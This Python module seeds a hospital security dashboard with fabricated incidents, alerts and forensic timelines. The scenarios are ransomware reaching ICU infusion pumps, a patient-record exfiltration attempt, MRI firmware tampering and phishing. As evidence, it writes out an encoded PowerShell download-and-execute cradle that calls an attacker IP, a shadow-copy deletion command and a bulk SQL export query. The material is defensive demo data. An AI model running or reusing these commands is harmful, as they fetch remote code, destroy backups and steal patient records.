from datetime import datetime, timezone, timedelta
from typing import List, Dict
from models import (
    Alert, Incident, TimelineEvent, MetricOverview,
    AlertSeverity, AlertStatus, AlertCategory,
    EvidenceType, PatientSafetyRisk
)

now = datetime.now(timezone.utc)
def fmt_time(offset_minutes: int) -> str:
    t = now - timedelta(minutes=offset_minutes)
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")

INCIDENTS_DB: Dict[str, Incident] = {
    "INC-8092": Incident(
        id="INC-8092",
        title="Ransomware Lateral Movement across St. Jude ICU Infusion Network",
        description="Cobalt Strike beaconing detected originating from Nurse Station Terminal 4 targeting Baxter Spectrum IQ Infusion Pumps in ICU Ward B. Possible medical device ransom lock attempt.",
        severity=AlertSeverity.CRITICAL,
        status=AlertStatus.INVESTIGATING,
        category=AlertCategory.RANSOMWARE,
        priority_score=98,
        created_at=fmt_time(42),
        updated_at=fmt_time(5),
        affected_assets=[
            "Nurse-WS-ICU-04 (192.168.42.14)",
            "Baxter-Pump-B01 to B12 (10.240.12.0/24)",
            "ICU-VLAN-40 Gateway (192.168.42.1)"
        ],
        iocs=[
            "185.220.101.52 (Command & Control)",
            "SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 (beacon.dll)",
            "Named Pipe: \\\\.\\pipe\\msse-8219-server",
            "TCP port 4443 anomalous egress"
        ],
        patient_safety_risk=PatientSafetyRisk.CRITICAL,
        assigned_analyst="Dr. Sarah Chen, CISSP",
        notes=[
            "42 mins ago: Intrusion Detection System flagged repeated SMB probes towards medical telemetry subnet.",
            "25 mins ago: VLAN 40 outbound egress isolated at perimeter firewall.",
            "10 mins ago: ICU Clinical Engineer notified; infusion pumps running locally in fail-safe autonomous mode."
        ],
        alert_ids=["ALT-1001", "ALT-1002", "ALT-1003"]
    ),
    "INC-8093": Incident(
        id="INC-8093",
        title="Unauthorized Epic EHR Bulk De-anonymization & Exfiltration Attempt",
        description="Abnormal SQL query burst exporting 14,200 patient health records (PHI/PII) with diagnostic codes from Oncology DB via compromised service account 'svc_labsync'.",
        severity=AlertSeverity.HIGH,
        status=AlertStatus.CONTAINED,
        category=AlertCategory.EHR_BREACH,
        priority_score=89,
        created_at=fmt_time(120),
        updated_at=fmt_time(30),
        affected_assets=[
            "EPIC-EHR-DB-CL01 (10.100.4.50)",
            "HL7-Interface-Engine (10.100.4.12)",
            "Oncology Research Portal (10.100.8.22)"
        ],
        iocs=[
            "Service Account: svc_labsync (Kerberoasted)",
            "Query: SELECT * FROM PATIENT_ENCOUNTER WHERE ICD10 LIKE 'C%' INTO OUTFILE",
            "Target Endpoint: sftp://transfer.med-archive-share[.]org"
        ],
        patient_safety_risk=PatientSafetyRisk.MODERATE,
        assigned_analyst="Marcus Vance, GCIH",
        notes=[
            "Account svc_labsync disabled at Active Directory.",
            "Database connection pools purged and Kerberos tickets revoked.",
            "HIPAA compliance officer notified for preliminary breach assessment."
        ],
        alert_ids=["ALT-1004", "ALT-1005"]
    ),
    "INC-8094": Incident(
        id="INC-8094",
        title="Philips Ingenia MRI Station 3 Firmware Signature Mismatch (IoMT)",
        description="Integrity check failed on Philips MRI scanner workstation during scheduled DICOM calibration. Modified bootloader checksum detected indicating potential rogue firmware injection.",
        severity=AlertSeverity.HIGH,
        status=AlertStatus.NEW,
        category=AlertCategory.IOMT_ANOMALY,
        priority_score=84,
        created_at=fmt_time(75),
        updated_at=fmt_time(75),
        affected_assets=[
            "MRI-Scanner-Philips-03 (172.28.14.88)",
            "DICOM-PACS-Gateway (172.28.14.1)"
        ],
        iocs=[
            "Expected FW Hash: a89f6d4e... | Found: 3c271b99...",
            "Source IP: 172.28.14.205 (Unknown laptop on Maintenance port)"
        ],
        patient_safety_risk=PatientSafetyRisk.CRITICAL,
        assigned_analyst="Unassigned",
        notes=[
            "Radiology Chief alerted. MRI scanner halted from live clinical scans until certified clean."
        ],
        alert_ids=["ALT-1006"]
    ),
    "INC-8095": Incident(
        id="INC-8095",
        title="Credential Harvesting Spear-Phishing Campaign Targeting Cardiac Care Staff",
        description="Spear-phishing emails impersonating Hospital IT regarding 'Urgent COVID/Flu Protocol Policy Updates' captured credentials of 6 cardiology nurses.",
        severity=AlertSeverity.MEDIUM,
        status=AlertStatus.RESOLVED,
        category=AlertCategory.PHISHING,
        priority_score=62,
        created_at=fmt_time(360),
        updated_at=fmt_time(110),
        affected_assets=[
            "Exchange-Mail-Gateway (10.10.1.25)",
            "Cardio-Nursing-Pool (Office365)"
        ],
        iocs=[
            "Sender: security-update@hospita1-portal-auth[.]com",
            "Landing URL: https://portal-login.secure-hospital-verify[.]net"
        ],
        patient_safety_risk=PatientSafetyRisk.LOW,
        assigned_analyst="Elena Rostova",
        notes=[
            "All 6 accounts forced password resets and MFA re-enrollment.",
            "Domain blocked on Cisco IronPort email filter and Cloudflare DNS."
        ],
        alert_ids=["ALT-1007"]
    )
}

ALERTS_DB: Dict[str, Alert] = {
    "ALT-1001": Alert(
        id="ALT-1001",
        incident_id="INC-8092",
        title="Cobalt Strike C2 Beaconing over Encrypted HTTPS",
        description="Repeated beacon intervals (every 45s with 10% jitter) from ICU Nurse Station 4 to external suspicious IP.",
        severity=AlertSeverity.CRITICAL,
        status=AlertStatus.INVESTIGATING,
        category=AlertCategory.RANSOMWARE,
        priority_score=98,
        created_at=fmt_time(42),
        source_ip="192.168.42.14",
        destination_ip="185.220.101.52",
        affected_device="Nurse-WS-ICU-04",
        device_type="Clinical Workstation",
        department="ICU Ward B"
    ),
    "ALT-1002": Alert(
        id="ALT-1002",
        incident_id="INC-8092",
        title="Unusual IoMT Port Scan targeting Infusion Pumps",
        description="Port 23 (Telnet) and 8080 (Config Web) port sweep across subnet 10.240.12.0/24 hosting life-critical infusion pumps.",
        severity=AlertSeverity.CRITICAL,
        status=AlertStatus.INVESTIGATING,
        category=AlertCategory.IOMT_ANOMALY,
        priority_score=95,
        created_at=fmt_time(38),
        source_ip="192.168.42.14",
        destination_ip="10.240.12.0/24",
        affected_device="Baxter Spectrum IQ Cluster",
        device_type="Infusion Pump Array",
        department="ICU Ward B"
    ),
    "ALT-1003": Alert(
        id="ALT-1003",
        incident_id="INC-8092",
        title="Shadow Copy Deletion Attempt on Clinical Server",
        description="Execution of 'vssadmin delete shadows /all /quiet' detected via PowerShell parent process winword.exe.",
        severity=AlertSeverity.CRITICAL,
        status=AlertStatus.CONTAINED,
        category=AlertCategory.RANSOMWARE,
        priority_score=94,
        created_at=fmt_time(30),
        source_ip="192.168.42.14",
        destination_ip="192.168.42.14",
        affected_device="Nurse-WS-ICU-04",
        device_type="Clinical Workstation",
        department="ICU Ward B"
    ),
    "ALT-1004": Alert(
        id="ALT-1004",
        incident_id="INC-8093",
        title="High Volume FHIR/HL7 Extraction Query",
        description="Query returned >10,000 patient records in under 3 minutes outside of standard hospital operational hours.",
        severity=AlertSeverity.HIGH,
        status=AlertStatus.CONTAINED,
        category=AlertCategory.EHR_BREACH,
        priority_score=89,
        created_at=fmt_time(120),
        source_ip="10.100.8.22",
        destination_ip="10.100.4.50",
        affected_device="EPIC-EHR-DB-CL01",
        device_type="Database Server",
        department="Oncology & Records"
    ),
    "ALT-1005": Alert(
        id="ALT-1005",
        incident_id="INC-8093",
        title="Kerberoasting TGS Ticket Request for svc_labsync",
        description="Anomalous RC4-HMAC encrypted ticket request submitted for elevated privilege service SPN.",
        severity=AlertSeverity.HIGH,
        status=AlertStatus.CONTAINED,
        category=AlertCategory.LATERAL_MOVEMENT,
        priority_score=82,
        created_at=fmt_time(125),
        source_ip="10.100.8.22",
        destination_ip="10.10.1.10",
        affected_device="Domain Controller 01",
        device_type="Active Directory DC",
        department="Core Infrastructure"
    ),
    "ALT-1006": Alert(
        id="ALT-1006",
        incident_id="INC-8094",
        title="IoMT DICOM Gateway Firmware Signature Alteration",
        description="Embedded Linux kernel checksum discrepancy detected on Philips Ingenia 3.0T MRI controller.",
        severity=AlertSeverity.HIGH,
        status=AlertStatus.NEW,
        category=AlertCategory.IOMT_ANOMALY,
        priority_score=84,
        created_at=fmt_time(75),
        source_ip="172.28.14.205",
        destination_ip="172.28.14.88",
        affected_device="MRI-Scanner-Philips-03",
        device_type="Magnetic Resonance Imaging",
        department="Radiology"
    ),
    "ALT-1007": Alert(
        id="ALT-1007",
        incident_id="INC-8095",
        title="Malicious Inbound Email with Credential Harvester Link",
        description="Mass email dispatched to nursing staff with obfuscated URL to lookalike hospital authentication portal.",
        severity=AlertSeverity.MEDIUM,
        status=AlertStatus.RESOLVED,
        category=AlertCategory.PHISHING,
        priority_score=62,
        created_at=fmt_time(360),
        source_ip="194.26.29.112",
        destination_ip="10.10.1.25",
        affected_device="Exchange-Mail-Gateway",
        device_type="Mail Gateway",
        department="Hospital Administration"
    )
}

TIMELINE_DB: Dict[str, List[TimelineEvent]] = {
    "INC-8092": [
        TimelineEvent(
            id="TLE-101",
            incident_id="INC-8092",
            timestamp=fmt_time(45),
            title="Malicious Macro Payload Executed via Word Attachment",
            description="Nurse opened email 'Clinical_Shift_Schedule_Oct2026.docm'. VBA script spawned powershell.exe with hidden window.",
            evidence_type=EvidenceType.AUDIT,
            source="CrowdStrike Falcon Sensor (Nurse-WS-ICU-04)",
            confidence_score=0.99,
            evidence_hash="SHA256: 7d1b32f41d9e7769910a30b5e0c6e91cb34589d8705c93bd8556f082e662886a",
            chain_of_custody="Verified by SecOps Evidence Locker #EVD-2026-092",
            raw_payload='powershell.exe -ExecutionPolicy Bypass -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAyAC8AYgAnACkA'
        ),
        TimelineEvent(
            id="TLE-102",
            incident_id="INC-8092",
            timestamp=fmt_time(42),
            title="Cobalt Strike C2 Beacon Initialized",
            description="Outbound TLS 1.3 handshake completed to 185.220.101.52:4443 with self-signed certificate issuer 'CN=Healthcare Support Org'.",
            evidence_type=EvidenceType.PCAP,
            source="Palo Alto Medical NGFW PanOS 11.2",
            confidence_score=0.97,
            evidence_hash="SHA256: 41b80d0d58849c67bb8a3915bc550c609594a11c828e19c3683a38da024f0c97",
            chain_of_custody="PCAP Captured at Span Port eth1/4; 4.2 MB saved to evidence locker",
            raw_payload="SYN/ACK sequence id 0x892a01 -> TLS ClientHello (SNI: dev-medical-support.com) -> HTTP POST /api/v2/metrics"
        ),
        TimelineEvent(
            id="TLE-103",
            incident_id="INC-8092",
            timestamp=fmt_time(38),
            title="Reconnaissance Scan Against ICU Baxter Infusion Pumps",
            description="SYN packets swept across 10.240.12.0/24 ports 23, 80, 443, 8080. 12 infusion pump controllers replied.",
            evidence_type=EvidenceType.FIREWALL,
            source="Suricata IoMT Medical Sensor #3",
            confidence_score=0.94,
            evidence_hash="SHA256: 9e32a67bcfa0012e87315a6b7e199d254b1f630045e0a6d5bc0395724e8832a1",
            chain_of_custody="Suricata EVE-JSON log verified against Core Switch Mirror",
            raw_payload="ALERT: ET SCAN Potential IoMT Scanner / Medical Device Sweep (192.168.42.14 -> 10.240.12.0/24)"
        ),
        TimelineEvent(
            id="TLE-104",
            incident_id="INC-8092",
            timestamp=fmt_time(30),
            title="Automated Shadow Copy & Backup Disruption Command",
            description="Attempt to execute vssadmin delete shadows to prevent local workstation file restoration.",
            evidence_type=EvidenceType.AUDIT,
            source="Windows Security Event Log 4688",
            confidence_score=0.98,
            evidence_hash="SHA256: a1f885e33d014bc900f074d6194b638910bca00127814a09e078913b8214f481",
            chain_of_custody="Extracted via Winlogbeat Sysmon collector",
            raw_payload="Process CommandLine: 'C:\\Windows\\system32\\vssadmin.exe delete shadows /all /quiet'"
        ),
        TimelineEvent(
            id="TLE-105",
            incident_id="INC-8092",
            timestamp=fmt_time(25),
            title="SOC Immediate Quarantine & Medical VLAN Isolation",
            description="Automated Playbook trigger: VLAN 40 placed into isolated containment mode. Medical device communications constrained to local pump safety loop.",
            evidence_type=EvidenceType.FIREWALL,
            source="Cisco ISE Medical NAC Controller",
            confidence_score=1.0,
            evidence_hash="SHA256: 5c91b70298a0d4c78103e5891d84ca201e54f738b02941b2c4e9760128fa8029",
            chain_of_custody="Applied by Analyst Dr. Sarah Chen via MediTrace AI Security Orchestrator",
            raw_payload="Quarantine ACL Applied: DENY ip any any; PERMIT tcp 10.240.12.0 0.0.0.255 10.240.12.1 eq 5000 (Safety Heartbeat)"
        )
    ],
    "INC-8093": [
        TimelineEvent(
            id="TLE-201",
            incident_id="INC-8093",
            timestamp=fmt_time(125),
            title="Kerberoasting Ticket Granting Service (TGS) Request",
            description="Compromised host queried Active Directory for service ticket of 'svc_labsync' using weak RC4 encryption.",
            evidence_type=EvidenceType.AUDIT,
            source="Microsoft Defender for Identity",
            confidence_score=0.95,
            evidence_hash="SHA256: 897c88b091fca038102941e780c102a0b355819df94191028301827419827301",
            chain_of_custody="Kerberos TGS audit record logged to Splunk index:winevent",
            raw_payload="EventID: 4769 | Ticket Encryption Type: 0x17 (RC4-HMAC) | Service Name: svc_labsync"
        ),
        TimelineEvent(
            id="TLE-202",
            incident_id="INC-8093",
            timestamp=fmt_time(120),
            title="Abnormal HL7/FHIR Database Dump Initiated",
            description="Database session executed batch SELECT against Oncology diagnosis records, retrieving 14,200 records in 180 seconds.",
            evidence_type=EvidenceType.HL7,
            source="Epic EHR Security Audit Vault",
            confidence_score=0.98,
            evidence_hash="SHA256: fb21049281a0b39418a09bca78219034bca0192809418290371a0b9418029381",
            chain_of_custody="FHIR AuditEvent resource captured and cryptographically signed",
            raw_payload="FHIR Query: GET /Patient?_has:Observation:code=ICD10-C34&_count=5000"
        ),
        TimelineEvent(
            id="TLE-203",
            incident_id="INC-8093",
            timestamp=fmt_time(30),
            title="Service Account Revocation and Database Session Kill",
            description="Analyst Marcus Vance revoked Kerberos ticket and locked account svc_labsync.",
            evidence_type=EvidenceType.AUDIT,
            source="MediTrace AI Identity Guardian",
            confidence_score=1.0,
            evidence_hash="SHA256: 2819034bca0192809418290371a0b9418029381fb21049281a0b39418a09bca7",
            chain_of_custody="Action logged to immutable SOC ledger",
            raw_payload="AD User 'svc_labsync' disabled. Active MSSQL sessions terminated."
        )
    ],
    "INC-8094": [
        TimelineEvent(
            id="TLE-301",
            incident_id="INC-8094",
            timestamp=fmt_time(75),
            title="MRI Host Bootloader Checksum Discrepancy",
            description="Embedded controller TPM integrity verification failed on Philips Ingenia 3.0T MRI system during initialization.",
            evidence_type=EvidenceType.DICOM,
            source="IoMT Integrity Sentinel",
            confidence_score=0.96,
            evidence_hash="SHA256: 3c271b99419208a0b12984102938a192038102938a1029384102938410293841",
            chain_of_custody="TPM 2.0 PCR-7 quote signature failure record stored",
            raw_payload="TPM PCR 7 mismatch. Computed: 3c271b99... Expected: a89f6d4e..."
        )
    ],
    "INC-8095": [
        TimelineEvent(
            id="TLE-401",
            incident_id="INC-8095",
            timestamp=fmt_time(360),
            title="Inbound Spear Phishing Campaign Detected",
            description="Spoofed email with subject 'Urgent COVID/Flu Clinical Policy Updates' delivered to 14 nursing staff.",
            evidence_type=EvidenceType.AUDIT,
            source="Microsoft 365 Defender Email Trace",
            confidence_score=0.91,
            evidence_hash="SHA256: 9481902830192830192830192830192830192830192830192830192830192830",
            chain_of_custody="Email headers archived in Exchange Quarantine EVD-95",
            raw_payload="From: Security Updates <security-update@hospita1-portal-auth.com>"
        )
    ]
}

UPLOADED_FILES_DB: List[Dict] = []
